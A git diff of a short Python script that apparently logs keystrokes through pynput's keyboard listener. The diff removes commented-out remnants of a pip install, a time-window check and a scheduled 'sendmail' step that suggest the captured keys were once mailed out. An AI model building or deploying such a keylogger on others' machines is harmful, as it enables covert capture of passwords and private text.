@@ -1,13 +1,11 @@
 import pip
-#pip.main(['install','pynput'])
-
 from pynput import keyboard
 #import schedule
 import os
 from time import strftime,gmtime
 import datetime
 
-#mouse=Controller()
+
 def on_press(key):
     print(datetime.datetime.now().strftime("%H:%M:%S"))
     try:
@@ -28,21 +26,6 @@ def on_press(key):
             f.write('')
 
     
-    #print("Sent mail")
-
-
-#def on_release(key):
-    #if int(datetime.datetime.now().strftime("%H")) not in range(8,23):
-        #return False
-
-    #return False
-
-
-    
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
-
-    
-
-#schedule.every(0.01).minutes.do(sendmail)
